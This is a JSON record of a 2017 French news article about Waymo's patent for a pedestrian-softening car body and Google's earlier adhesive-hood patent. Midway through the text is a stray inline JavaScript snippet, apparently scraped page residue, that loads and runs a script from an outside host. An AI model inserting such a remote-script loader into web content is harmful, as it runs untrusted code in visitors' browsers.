{"title": "Voiture autonome : Google veut proteger les pietons grace a une carrosserie pliable", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-08-16", "content": "Un brevet depose recemment par Waymo, la filiale d'Alphabet (maison mere de Google) qui travaille sur la voiture autonome, decrit un concept de carrosserie capable de s'assouplir en cas de choc avec un pieton ou un cycliste afin de reduire la violence de l'impact. Apres avoir imagine des  airbags  exterieurs et un capot recouvert d'un adhesif puissant (voir article ci-dessous),  Google  continue d'explorer des solutions inedites pour rendre ses voitures autonomes moins dangereuses en cas de choc avec un pieton ou un  cycliste . La derniere trouvaille de la firme californienne est etonnante. Waymo, la filiale d'Alphabet (maison mere de  Google ) en charge de la  voiture autonome , vient de se voir octroyer un brevet pour un concept de carrosserie capable, en quelque sorte, de se ramollir juste avant un impact avec un pieton. <<  La force de l'impact du vehicule est un facteur primaire dans l'ampleur des degats que celui-ci peut causer  >>, lit-on dans le brevet emis par l' USPTO  (le bureau americain des brevets et des marques). Voici un dessin schematisant le concept de carrosserie deformable brevete par Waymo. La zone pointillee represente la partie externe qui pourrait s'assouplir en cas de choc avec un pieton. (c) Waymo                               Un systeme de cables ou de ressorts pour assouplir la carrosserie Pour reduire la force de l'impact, Waymo a imagine une carrosserie flexible dont la rigidite serait geree par un systeme de tension fait de cables, de ressorts ou de tiges. Lorsque les capteurs de la  voiture autonome  detecteraient l'imminence d'un impact avec un autre objet, en l'occurrence une personne, la tension serait reduite afin que l'element de carrosserie puisse se deformer au maximum afin d'absorber le choc. S'il s'agit au contraire d'un contact avec un autre vehicule, la rigidite serait augmentee en consequence.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Interessant sur le papier, un tel concept semble assez complexe a transposer sur des voitures de serie qui doivent repondre a des normes tres strictes en matiere de resistance aux impacts. De plus, son efficacite reelle reste a demontrer. Pour en savoir plus Google veut scotcher les pietons accidentes au capot de sa voiture Article initial de Numerama, paru le 21/05/2016 Une voiture autonome ne sera jamais totalement infaillible. Conscient de cela, Google reflechit a des solutions pour proteger les pietons en cas de collisions. Apres les airbags exterieurs, le geant californien a imagine un capot moteur recouvert d'un papier hautement adhesif. En cas de choc, la victime resterait litteralement scotchee au lieu de rebondir et de subir plusieurs impacts. Lorsqu'un pieton est percute par une  voiture , il ne subit pas un seul impact traumatique, mais au moins deux. Apres avoir ete heurtee par le pare-chocs, la victime est en effet ejectee du capot et retombe violemment sur le sol ou sur le  toit  de l' automobile . Mais peut-on faire mieux ? Peut-etre. Dans le cadre du developpement de ses voitures autonomes,  Google  a depose un brevet pour une invention qui vise a eviter ce deuxieme impact. L'idee de la firme de Mountain View consiste a appliquer une substance hautement adhesive sur le capot des vehicules. Cela permettrait de retenir le pieton sur la voiture afin qu'il ne soit plus ejecte. Pour vous faire une idee, vous pouvez essayer d'imaginer une mouche coincee dans un piege adhesif anti-insecte, qui ne peut plus bouger. Voici un dessin issu du brevet depose par Google. En cas de choc, le pieton resterait colle sur la capot grace au revetement adhesif. Celui-ci serait protege par un film pour empecher que la voiture ne se transforme en attrape-mouches geant... (c) Google                               Une pellicule de protection pour eviter d'amasser tous les insectes sur le capot Et justement, comment les voitures  Google  pourraient-elles eviter d'agglutiner sur leurs capots tous les insectes qu'elles croiseront ? L'entreprise affirme que la surface adhesive disposera d'un fin revetement qui empechera d'amasser tous les moucherons sur la route. Ce revetement craquerait lors d'un impact avec un objet plus lourd, au benefice de la couche adhesive. Bien que Google assure une securite optimale pour ses  voitures autonomes , ce n'est pas la premiere fois que la firme imagine un dispositif permettant de sauver la vie d'eventuelles victimes pedestres. En 2015, un brevet avait egalement ete depose. Celui-ci evoquait la possibilite d'installer des airbags exterieurs qui amortiraient le choc entre une  voiture  et un pieton. Car meme si la voiture est attentive a tout, et reagit plus vite que l'humain, on n'est jamais a l'abri d'un enfant qui deboule de derriere une camionnette pour aller chercher son  ballon , ou d'un algorithme defaillant.  ", "theme": "tech"}